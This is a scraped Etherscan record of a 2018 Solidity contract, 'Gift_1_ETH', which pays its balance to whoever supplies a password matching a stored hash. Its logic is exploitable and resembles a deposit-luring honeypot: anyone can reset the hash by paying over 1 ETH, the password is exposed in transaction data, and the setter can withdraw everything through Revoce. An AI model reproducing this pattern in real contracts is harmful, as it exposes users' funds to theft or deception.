//token_name	
//token_url	https://etherscan.io//address/0xb38beba95e0e21a97466c452454debe2658527f7#code
//spider_time	2018/07/08 12:43:50
//token_Transactions	2 txns
//token_price	

pragma solidity ^0.4.19;

contract Gift_1_ETH
{
    bool passHasBeenSet = false;
    
    address sender;
    
    bytes32 public hashPass;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(!passHasBeenSet&&(msg.value > 1 ether))
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}